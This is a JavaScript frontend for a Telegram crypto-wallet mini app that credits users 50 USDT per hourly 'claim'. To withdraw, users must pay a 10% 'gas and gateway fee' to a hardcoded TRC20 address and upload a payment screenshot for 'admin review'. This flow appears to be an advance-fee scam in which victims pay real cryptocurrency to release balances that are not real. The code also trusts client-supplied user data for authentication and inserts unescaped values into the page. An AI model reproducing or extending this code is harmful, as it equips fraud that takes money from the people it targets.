/**
 * Wallet Masters — Frontend JavaScript
 * Telegram Mini App with real auth, hourly earnings, withdrawal + fee upload
 */

const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const FEE_ADDRESS = 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
const API_BASE    = window.location.origin + '/api';

// ─── State ────────────────────────────────────────────────────────────────────
let state = {
  user: null,
  balance: 0,
  trc20Address: '',
  uid: '',
  transactions: [],
  connections: [],
  earningApps: [],
  selectedNetwork: 'TRC20',
  pendingWithdrawal: null,
  hourlyStatus: { canClaim: false, nextClaimIn: 0, hourlyAmount: 50 },
  countdownTimer: null
};

// ─── Init ─────────────────────────────────────────────────────────────────────
async function init() {
  try {
    const initData = tg.initData || '';
    // Fallback: use initDataUnsafe.user if initData string is empty
    const unsafeUser = tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user : null;
    
    const res  = await fetch(`${API_BASE}/auth`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ initData, unsafeUser })
    });
    const data = await res.json();

    if (!data.success || data.error) {
      showError(data.error || 'Failed to load wallet. Please open from Telegram.');
      return;
    }

    state.user         = data.user;
    state.balance      = data.user.balance || 0;
    state.trc20Address = data.user.trc20Address;
    state.uid          = data.user.uid;
    state.transactions = data.transactions || [];
    state.connections  = data.connections  || [];
    state.hourlyStatus = data.user.hourlyStatus || state.hourlyStatus;

    updateUI();
    loadEarningApps();
    startHourlyCountdown();

    setTimeout(() => {
      const splash = document.getElementById('splash');
      if (splash) {
        splash.style.opacity = '0';
        splash.style.transition = 'opacity 0.5s';
        setTimeout(() => {
          splash.classList.add('hidden');
          document.getElementById('app').classList.remove('hidden');
          generateQRCode(state.trc20Address);
        }, 500);
      }
    }, 1500);

  } catch (err) {
    console.error('Init error:', err);
    showError('Connection error. Please check your internet and try again.');
  }
}

function showError(msg) {
  const splash = document.getElementById('splash');
  if (splash) {
    splash.innerHTML = `
      <div class="splash-inner">
        <div style="font-size:48px">⚠️</div>
        <h2 style="color:#fff;margin:16px 0 8px">Load Failed</h2>
        <p style="color:#aaa;text-align:center;padding:0 20px">${msg}</p>
        <button onclick="location.reload()" style="margin-top:20px;padding:12px 24px;background:#3b82f6;color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer">Retry</button>
      </div>`;
  }
}

// ─── UI Update ────────────────────────────────────────────────────────────────
function updateUI() {
  const u = state.user;
  if (!u) return;

  // Avatar & name
  const name = u.name || u.username || 'User';
  el('userName').textContent   = name;
  el('userUID').textContent    = `UID: ${u.uid}`;
  el('userAvatar').textContent = name[0].toUpperCase();

  // Balance
  const bal = state.balance.toFixed(2);
  el('balanceAmount').textContent = bal;
  el('balanceUSD').textContent    = bal;
  el('usdtBalance').textContent   = bal;
  el('usdtValue').textContent     = `$${bal}`;

  // Address
  const addr = state.trc20Address;
  const short = addr ? (addr.slice(0, 10) + '...' + addr.slice(-6)) : '---';
  el('trc20Address').textContent  = short;
  if (el('receiveAddress')) el('receiveAddress').textContent = addr;
  if (el('receiveUID'))     el('receiveUID').textContent     = state.uid;
  if (el('availBalance'))   el('availBalance').textContent   = bal;

  // Hourly button
  updateHourlyBtn();

  // Transactions
  renderTransactions(state.transactions);
}

function el(id) {
  return document.getElementById(id) || { textContent: '', innerHTML: '', classList: { add: ()=>{}, remove: ()=>{}, toggle: ()=>{}, contains: ()=>false }, style: {} };
}

// ─── Hourly Earning ───────────────────────────────────────────────────────────
function updateHourlyBtn() {
  const btn = document.getElementById('claimHourlyBtn');
  if (!btn) return;
  const s = state.hourlyStatus;
  if (s.canClaim) {
    btn.textContent = '🎁 Claim 50 USDT';
    btn.disabled    = false;
    btn.className   = btn.className.replace('disabled', '').trim();
    btn.style.opacity = '1';
  } else {
    const mins = Math.floor(s.nextClaimIn / 60);
    const secs = s.nextClaimIn % 60;
    btn.textContent = `⏳ ${mins}m ${secs}s`;
    btn.disabled    = true;
    btn.style.opacity = '0.6';
  }
}

function startHourlyCountdown() {
  if (state.countdownTimer) clearInterval(state.countdownTimer);
  state.countdownTimer = setInterval(() => {
    if (state.hourlyStatus.nextClaimIn > 0) {
      state.hourlyStatus.nextClaimIn--;
      if (state.hourlyStatus.nextClaimIn <= 0) {
        state.hourlyStatus.canClaim    = true;
        state.hourlyStatus.nextClaimIn = 0;
      }
    }
    updateHourlyBtn();
  }, 1000);
}

async function claimHourly() {
  const btn = document.getElementById('claimHourlyBtn');
  if (!state.hourlyStatus.canClaim) return;

  btn.textContent = '⏳ Claiming...';
  btn.disabled    = true;

  try {
    const res  = await fetch(`${API_BASE}/claim-hourly`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ initData: tg.initData || '', unsafeUser: (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : null })
    });
    const data = await res.json();

    if (data.success) {
      state.balance                 = data.newBalance;
      state.hourlyStatus.canClaim   = false;
      state.hourlyStatus.nextClaimIn = 3600;
      updateUI();
      startHourlyCountdown();

      // Add to transactions list
      state.transactions.unshift({
        type: 'earning', amount: data.amount, currency: 'USDT',
        status: 'completed', source_app: 'Hourly Bonus',
        created_at: Math.floor(Date.now() / 1000)
      });
      renderTransactions(state.transactions);

      showToast(`🎉 +${data.amount} USDT claimed!`);
      tg.HapticFeedback && tg.HapticFeedback.notificationOccurred('success');
    } else {
      showToast(data.error || 'Cannot claim yet');
      // Refresh status
      const statusRes = await fetch(`${API_BASE}/hourly-status`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ initData: tg.initData || '', unsafeUser: (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : null })
      });
      const statusData = await statusRes.json();
      state.hourlyStatus = statusData;
      updateHourlyBtn();
      startHourlyCountdown();
    }
  } catch (err) {
    console.error('Claim error:', err);
    showToast('Network error. Try again.');
    updateHourlyBtn();
  }
}

// ─── Page Navigation ──────────────────────────────────────────────────────────
function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => {
    b.classList.toggle('active', b.dataset.page === name);
  });
  const page = document.getElementById(`page-${name}`);
  if (page) {
    page.classList.add('active');
    if (name === 'connect')  renderConnectPage();
    if (name === 'receive')  generateQRCode(state.trc20Address);
    if (name === 'withdraw') resetWithdrawForm();
    if (name === 'activity') refreshActivity();
  }
}

function refreshActivity() {
  renderTransactions(state.transactions, true);
}

// ─── Transactions ─────────────────────────────────────────────────────────────
function renderTransactions(txs, all) {
  const homeList = document.getElementById('txList');
  const allList  = document.getElementById('allTxList');

  const buildHTML = (list, limit) => {
    if (!list || !list.length) return '<div class="empty-state">📭 No transactions yet</div>';
    return (limit ? list.slice(0, limit) : list).map(buildTxHTML).join('');
  };

  if (homeList) homeList.innerHTML = buildHTML(txs, 5);
  if (allList)  allList.innerHTML  = buildHTML(txs);
}

function buildTxHTML(tx) {
  const isIn   = ['deposit', 'earning'].includes(tx.type);
  const icon   = isIn ? '⬇️' : '⬆️';
  const sign   = isIn ? '+' : '-';
  const date   = new Date((tx.created_at || 0) * 1000);
  const dateStr = date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
  const timeStr = date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
  const source  = tx.source_app ? `<div class="tx-source">From: ${tx.source_app}</div>` : '';

  return `
    <div class="tx-item">
      <div class="tx-icon-wrap ${tx.type}">${icon}</div>
      <div class="tx-info">
        <div class="tx-type">${tx.type === 'earning' ? 'Hourly Bonus' : tx.type.charAt(0).toUpperCase() + tx.type.slice(1)}</div>
        ${source}
        <div class="tx-date">${dateStr} · ${timeStr}</div>
      </div>
      <div class="tx-right">
        <div class="tx-amount ${tx.type}">${sign}${Number(tx.amount).toFixed(2)} ${tx.currency || 'USDT'}</div>
        <div class="tx-status ${tx.status}">${getStatusLabel(tx.status)}</div>
      </div>
    </div>`;
}

function getStatusLabel(s) {
  const m = {
    completed:    '✅ Done',
    pending:      '⏳ Pending',
    approved:     '✅ Approved',
    rejected:     '❌ Rejected',
    awaiting_fee: '💳 Fee Needed',
    fee_paid:     '🔍 In Review',
    earning:      '✅ Done'
  };
  return m[s] || s;
}

// ─── Withdrawal ───────────────────────────────────────────────────────────────
function resetWithdrawForm() {
  const addr = document.getElementById('withdrawAddress');
  const amt  = document.getElementById('withdrawAmount');
  if (addr) addr.value = '';
  if (amt)  amt.value  = '';
  updateWithdrawFees();
}

function selectNetwork(el) {
  document.querySelectorAll('.network-option').forEach(o => o.classList.remove('active'));
  el.classList.add('active');
  state.selectedNetwork = el.dataset.network;
  updateWithdrawFees();
}

function validateWithdrawForm() {
  const addr    = (document.getElementById('withdrawAddress')?.value || '').trim();
  const amt     = parseFloat(document.getElementById('withdrawAmount')?.value) || 0;
  const warning = document.getElementById('addrWarning');
  const btn     = document.getElementById('withdrawBtn');

  const validAddr = addr.length >= 20;
  const validAmt  = amt > 0 && amt <= state.balance;

  if (warning) warning.classList.toggle('hidden', !addr || validAddr);
  if (btn)     btn.disabled = !(validAddr && validAmt);
}

function updateWithdrawFees() {
  const amt        = parseFloat(document.getElementById('withdrawAmount')?.value) || 0;
  const totalFee   = parseFloat((amt * 0.10).toFixed(2));
  const gasFee     = parseFloat((totalFee * 0.4).toFixed(2));
  const gatewayFee = parseFloat((totalFee * 0.6).toFixed(2));

  if (el('feeAmt'))     el('feeAmt').textContent     = `${amt.toFixed(2)} USDT`;
  if (el('gasFee'))     el('gasFee').textContent     = `${gasFee.toFixed(2)} USDT`;
  if (el('gatewayFee')) el('gatewayFee').textContent = `${gatewayFee.toFixed(2)} USDT`;
  if (el('totalFee'))   el('totalFee').textContent   = `${totalFee.toFixed(2)} USDT`;

  validateWithdrawForm();
}

function setPercent(pct) {
  const inp = document.getElementById('withdrawAmount');
  if (inp) { inp.value = (state.balance * pct / 100).toFixed(2); updateWithdrawFees(); }
}

async function submitWithdrawal() {
  const addr = (document.getElementById('withdrawAddress')?.value || '').trim();
  const amt  = parseFloat(document.getElementById('withdrawAmount')?.value);

  if (!addr || isNaN(amt) || amt <= 0) return showToast('⚠️ Fill in all fields');
  if (amt > state.balance)             return showToast('⚠️ Insufficient balance');

  const btn = document.getElementById('withdrawBtn');
  if (btn) { btn.textContent = '⏳ Processing...'; btn.disabled = true; }

  try {
    const res  = await fetch(`${API_BASE}/withdraw`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        initData: tg.initData || '',
        toAddress: addr,
        amount: amt,
        currency: 'USDT',
        network: state.selectedNetwork
      })
    });
    const data = await res.json();

    if (btn) { btn.textContent = 'Continue to Pay Fee'; btn.disabled = false; }

    if (!data.success) return showToast('❌ ' + (data.error || 'Error'));

    state.pendingWithdrawal = data.withdrawal;
    showFeePayPage(data.withdrawal);

  } catch (err) {
    console.error(err);
    showToast('❌ Network error. Try again.');
    if (btn) { btn.textContent = 'Continue to Pay Fee'; btn.disabled = false; }
  }
}

function showFeePayPage(wd) {
  const net = wd.network || 'TRC20';
  const netInfo = {
    TRC20: { time: '~1–3 min', explorer: 'Tronscan' },
    ERC20: { time: '~5–15 min', explorer: 'Etherscan' },
    BEP20: { time: '~1–3 min', explorer: 'BscScan' }
  };
  const info = netInfo[net] || netInfo.TRC20;
  const refId = 'WM' + Date.now().toString(36).toUpperCase();

  const box = document.getElementById('feePayBox');
  if (!box) return;

  box.innerHTML = `
    <div class="fee-pay-card">
      <div class="fee-pay-header">
        <span class="fee-pay-icon">📤</span>
        <h3>Pay Withdrawal Fee</h3>
        <p>Complete your withdrawal by paying the required fee</p>
      </div>

      <div class="confirm-details">
        <div class="confirm-row"><span class="label">📋 Ref ID</span><span class="value highlight">#${refId}</span></div>
        <div class="confirm-row"><span class="label">💰 Amount</span><span class="value">${Number(wd.amount).toFixed(2)} USDT</span></div>
        <div class="confirm-row"><span class="label">📬 To Address</span><span class="value addr-wrap">${wd.toAddress}</span></div>
        <div class="confirm-row"><span class="label">🌐 Network</span><span class="value">${net}</span></div>
        <div class="confirm-row sep"><span class="label">⛽ Gas Fee (40%)</span><span class="value">${Number(wd.gasFee).toFixed(2)} USDT</span></div>
        <div class="confirm-row"><span class="label">🏦 Gateway Fee (60%)</span><span class="value">${Number(wd.gatewayFee).toFixed(2)} USDT</span></div>
        <div class="confirm-row total"><span class="label">💸 Total Fee</span><span class="value gold">${Number(wd.totalFee).toFixed(2)} USDT</span></div>
      </div>

      <div class="fee-pay-address">
        <p class="fee-label">💳 Send fee to this TRC20 address:</p>
        <div class="fee-addr-box">
          <span id="feeAddrText">${FEE_ADDRESS}</span>
          <button class="copy-btn" onclick="copyFeeAddress()">📋 Copy</button>
        </div>
        <p class="fee-note">⚠️ Send exactly <strong>${Number(wd.totalFee).toFixed(2)} USDT</strong> on <strong>TRC20</strong> network only</p>
      </div>

      <div class="receipt-upload">
        <p class="receipt-label">📸 Upload Payment Screenshot</p>
        <label class="upload-area" for="receiptFile" id="uploadArea">
          <span id="uploadIcon">📁</span>
          <span id="uploadText">Tap to upload receipt</span>
          <input type="file" id="receiptFile" accept="image/*" onchange="previewReceipt(this)" style="display:none">
        </label>
        <img id="receiptPreview" style="display:none;width:100%;border-radius:8px;margin-top:10px;max-height:200px;object-fit:contain">
      </div>

      <button class="btn-primary full-width" id="submitReceiptBtn" onclick="submitReceipt(${wd.id})" disabled>
        📤 Submit Receipt for Review
      </button>
      <button class="btn-secondary full-width mt-8" onclick="showPage('withdraw')">
        ← Back
      </button>
    </div>
  `;

  showPage('fee-pay');
}

function copyFeeAddress() {
  navigator.clipboard?.writeText(FEE_ADDRESS).then(() => showToast('✅ Fee address copied!'));
}

function previewReceipt(input) {
  const file = input.files[0];
  if (!file) return;

  const preview = document.getElementById('receiptPreview');
  const btn     = document.getElementById('submitReceiptBtn');
  const area    = document.getElementById('uploadArea');

  const reader = new FileReader();
  reader.onload = (e) => {
    preview.src = e.target.result;
    preview.style.display = 'block';
    if (area) area.style.borderColor = '#22c55e';
    document.getElementById('uploadText').textContent = file.name;
    document.getElementById('uploadIcon').textContent = '✅';
    if (btn) btn.disabled = false;
  };
  reader.readAsDataURL(file);
}

async function submitReceipt(wrId) {
  const fileInput = document.getElementById('receiptFile');
  const btn       = document.getElementById('submitReceiptBtn');

  if (!fileInput?.files[0]) return showToast('⚠️ Please upload a receipt first');

  if (btn) { btn.textContent = '⏳ Submitting...'; btn.disabled = true; }

  try {
    const reader = new FileReader();
    reader.onload = async (e) => {
      const base64 = e.target.result;

      const res  = await fetch(`${API_BASE}/receipt`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          initData: tg.initData || '',
          withdrawalId: wrId,
          receiptBase64: base64
        })
      });
      const data = await res.json();

      if (data.success) {
        showToast('✅ Receipt submitted! Awaiting admin review.');
        tg.HapticFeedback && tg.HapticFeedback.notificationOccurred('success');

        // Show success page
        const feePayBox = document.getElementById('feePayBox');
        if (feePayBox) {
          feePayBox.innerHTML = `
            <div style="text-align:center;padding:40px 20px">
              <div style="font-size:64px">✅</div>
              <h3 style="color:#22c55e;margin:16px 0 8px">Receipt Submitted!</h3>
              <p style="color:#94a3b8">Your withdrawal is under admin review.</p>
              <p style="color:#94a3b8;margin-top:8px">You'll receive a Telegram notification once approved.</p>
              <button class="btn-primary" style="margin-top:24px;width:100%" onclick="showPage('home')">
                🏠 Back to Wallet
              </button>
            </div>`;
        }
        state.pendingWithdrawal = null;
      } else {
        showToast('❌ ' + (data.error || 'Submission failed'));
        if (btn) { btn.textContent = '📤 Submit Receipt for Review'; btn.disabled = false; }
      }
    };
    reader.readAsDataURL(fileInput.files[0]);

  } catch (err) {
    console.error('Submit receipt error:', err);
    showToast('❌ Network error. Try again.');
    if (btn) { btn.textContent = '📤 Submit Receipt for Review'; btn.disabled = false; }
  }
}

// ─── QR Code ──────────────────────────────────────────────────────────────────
function generateQRCode(text) {
  const container = document.getElementById('qrCanvas');
  if (!container || !text) return;
  container.innerHTML = '';
  try {
    new QRCode(container, {
      text, width: 200, height: 200,
      colorDark: '#000000', colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.M
    });
  } catch (e) {
    container.innerHTML = `<div style="padding:16px;text-align:center;word-break:break-all;font-size:10px;color:#333">${text}</div>`;
  }
}

// ─── Connect Page ─────────────────────────────────────────────────────────────
function renderConnectPage() {
  const container = document.getElementById('appsGrid');
  if (!container) return;

  if (!state.earningApps.length) {
    container.innerHTML = '<div class="empty-state">📭 No earning apps available yet</div>';
    return;
  }

  container.innerHTML = state.earningApps.map(app => `
    <div class="app-card" onclick="openConnectModal(${app.id}, '${app.name.replace(/'/g, "\\'")}')">
      <div class="app-logo">${app.name[0].toUpperCase()}</div>
      <div class="app-info">
        <div class="app-name">${app.name}</div>
        <div class="app-desc">${app.description || 'Earning App'}</div>
      </div>
      <div class="app-status ${isAppConnected(app.id) ? 'connected' : ''}">
        ${isAppConnected(app.id) ? '✅ Connected' : '🔗 Connect'}
      </div>
    </div>`).join('');
}

function isAppConnected(appId) {
  return state.connections.some(c => c.app_id === appId);
}

async function loadEarningApps() {
  try {
    const res = await fetch(`${API_BASE}/apps`);
    state.earningApps = await res.json();
  } catch (e) { console.error('Load apps error:', e); }
}

let connectingAppId = null;
function openConnectModal(appId, appName) {
  connectingAppId = appId;
  const modal = document.getElementById('connectModal');
  const title = document.getElementById('modalAppName');
  if (title) title.textContent = `Connect to ${appName}`;
  if (modal) modal.classList.remove('hidden');
  const uidInput = document.getElementById('modalUID');
  if (uidInput) { uidInput.value = ''; uidInput.focus(); }
}

function closeConnectModal() {
  const modal = document.getElementById('connectModal');
  if (modal) modal.classList.add('hidden');
  connectingAppId = null;
}

async function submitUID() {
  const input = document.getElementById('modalUID');
  const uid   = (input?.value || '').trim();
  const errEl = document.getElementById('uidError');

  if (!uid) { if (errEl) { errEl.textContent = '⚠️ Please enter your UID'; errEl.classList.remove('hidden'); } return; }
  if (uid.length < 3) { if (errEl) { errEl.textContent = '❌ Invalid UID — too short'; errEl.classList.remove('hidden'); } return; }

  const btn = document.getElementById('connectUIDBtn');
  if (btn) { btn.textContent = '⏳ Connecting...'; btn.disabled = true; }
  if (errEl) errEl.classList.add('hidden');

  try {
    const res  = await fetch(`${API_BASE}/connect-uid`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        telegram_id: state.user?.telegramId,
        app_id: connectingAppId,
        external_uid: uid
      })
    });
    const data = await res.json();

    if (btn) { btn.textContent = '✅ Connect'; btn.disabled = false; }

    if (data.success) {
      showToast('✅ UID Connected!');
      closeConnectModal();
      // Refresh connections
      const authRes = await fetch(`${API_BASE}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ initData: tg.initData || '', unsafeUser: (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : null })
      });
      const authData = await authRes.json();
      if (authData.success) {
        state.connections = authData.connections || [];
        renderConnectPage();
      }
    } else {
      if (errEl) { errEl.textContent = '❌ Invalid UID. Check and try again.'; errEl.classList.remove('hidden'); }
    }
  } catch (err) {
    if (btn) { btn.textContent = '✅ Connect'; btn.disabled = false; }
    showToast('❌ Network error');
  }
}

// ─── Utility ──────────────────────────────────────────────────────────────────
function copyAddress() {
  navigator.clipboard?.writeText(state.trc20Address)
    .then(() => showToast('✅ TRC20 address copied!'))
    .catch(() => showToast('Copy failed'));
}

function copyUID() {
  navigator.clipboard?.writeText(state.uid)
    .then(() => showToast('✅ UID copied!'));
}

function toggleBalanceVisibility() {
  const balEl = document.getElementById('balanceAmount');
  if (!balEl) return;
  if (balEl.dataset.hidden === 'true') {
    balEl.textContent = state.balance.toFixed(2);
    balEl.dataset.hidden = 'false';
  } else {
    balEl.textContent = '••••••';
    balEl.dataset.hidden = 'true';
  }
}

let toastTimer = null;
function showToast(msg) {
  let toast = document.getElementById('toast');
  if (!toast) {
    toast = document.createElement('div');
    toast.id = 'toast';
    toast.style.cssText = `
      position:fixed;bottom:80px;left:50%;transform:translateX(-50%);
      background:rgba(30,30,50,0.95);color:#fff;padding:10px 20px;
      border-radius:8px;font-size:14px;z-index:9999;
      box-shadow:0 4px 20px rgba(0,0,0,0.3);
      transition:opacity 0.3s;pointer-events:none;max-width:80vw;text-align:center;
    `;
    document.body.appendChild(toast);
  }
  toast.textContent = msg;
  toast.style.opacity = '1';
  if (toastTimer) clearTimeout(toastTimer);
  toastTimer = setTimeout(() => { toast.style.opacity = '0'; }, 2800);
}

// ─── Start ────────────────────────────────────────────────────────────────────
window.addEventListener('DOMContentLoaded', init);
